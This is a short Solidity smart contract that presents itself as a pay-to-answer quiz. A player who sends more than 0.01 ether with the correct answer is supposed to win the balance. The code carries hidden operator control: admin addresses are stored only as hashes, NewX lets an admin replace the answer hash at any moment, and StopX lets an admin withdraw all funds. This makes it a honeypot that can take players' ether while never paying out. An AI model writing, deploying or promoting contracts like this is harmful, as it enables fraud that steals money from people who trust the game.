pragma solidity 0.8.0;

contract X_QUIZX
{

    event Encoded(bytes32 something);

    function testX() public {
        emit Encoded(keccak256(abi.encodePacked(msg.sender)));
    }

    function TryX(string memory _response) public payable
    {
        require(msg.sender == tx.origin);

        if (responseHash == keccak256(abi.encode(_response)) && msg.value > 0.01 ether)
        {
            payable(msg.sender).transfer(address(this).balance);
        }
    }

    string public question;

    bytes32 responseHash;

    mapping(bytes32 => bool) admin;

    function StartX(string calldata _question, string calldata _response) public payable {
        if (responseHash == 0x0) {
            responseHash = keccak256(abi.encode(_response));
            question = _question;
        }
    }

    function StopX() public payable isAdmin {
        payable(msg.sender).transfer(address(this).balance);
    }

    function NewX(string calldata _question, bytes32 _responseHash) public payable isAdmin {
        question = _question;
        responseHash = _responseHash;
    }

    constructor(bytes32[] memory admins) {
        for (uint256 i = 0; i < admins.length; i++) {
            admin[admins[i]] = true;
        }
    }

    modifier isAdmin(){
        require(admin[keccak256(abi.encodePacked(msg.sender))]);
        _;
    }

    fallback() external {}
}